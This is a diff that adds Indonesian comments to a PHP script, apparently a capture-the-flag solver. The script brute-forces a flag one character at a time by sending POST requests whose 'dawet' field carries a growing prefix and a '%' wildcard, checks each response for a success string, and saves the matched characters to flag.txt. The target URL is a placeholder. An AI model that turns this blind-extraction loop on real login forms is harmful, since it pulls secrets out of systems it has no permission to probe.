@@ -1,4 +1,5 @@
 <?php 
+
 		$url = 'linknya';
 		
 		foreach (range(1, 30) as $i) 
@@ -15,8 +16,8 @@
 					// $specialchars 		= ["-","&","{","}","_",""];//etc
 					// $alphabet = array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','-','+','{','}');
 					foreach (array_merge($specialchars,range('A','Z'), range('a','z'), range('0','9')) as $letter) 
-					{
-						$myvars = "username=admin%&dawet=".$content.$letter."%&submit";
+					{//melakukan looping berdasarkan string dan chars 
+						$myvars = "username=admin%&dawet=".$content.$letter."%&submit";//kirim request POST
 						$ch = curl_init( $url );
 						curl_setopt( $ch, CURLOPT_POST, 1);
 						curl_setopt( $ch, CURLOPT_POSTFIELDS, $myvars);
@@ -25,26 +26,26 @@
 						curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
 						$response = curl_exec( $ch );
 
-						if (eregi("N1ce, try more !", $response)) 
+						if (eregi("N1ce, try more !", $response)) // jika response terdapat kata N1ce, try more !
 						{
-							$status = true;
+							$status = true; // maka TRUE
 						}else{
-							$status = false;
+							$status = false;// maka FALSE
 						}
 
-						if ($status == true) {
-							echo $letter."<<< BINGOOO ! \n";
-							$current = file_get_contents('flag.txt');
-							$current .= "".$letter;
-							file_put_contents('flag.txt', $current);
+						if ($status == true) {//dan jika TRUE
+							echo $letter."<<< BINGOOO ! \n";// tulis BINGOOO
+							$current = file_get_contents('flag.txt'); //ambil dulu isi flag.txt saat ini
+							$current .= "".$letter;//agar file put contents tidak mereplace dengan kata yg d get terakhir
+							file_put_contents('flag.txt', $current);//dan taruh di file flag.txt
 							break;
 						}
 
 						else{
-							echo $letter .':'.'bukan anu itu'."\n";
+							echo $letter .':'.'bukan anu itu'."\n";// jika FALSE , cetak bukan anu itu
 						} 
 					}
-					continue;
+					continue;//klo ketemu lanjut hentikan loop array string dan chars kemudian scan dari awal
 					$status = "";
 
 			}
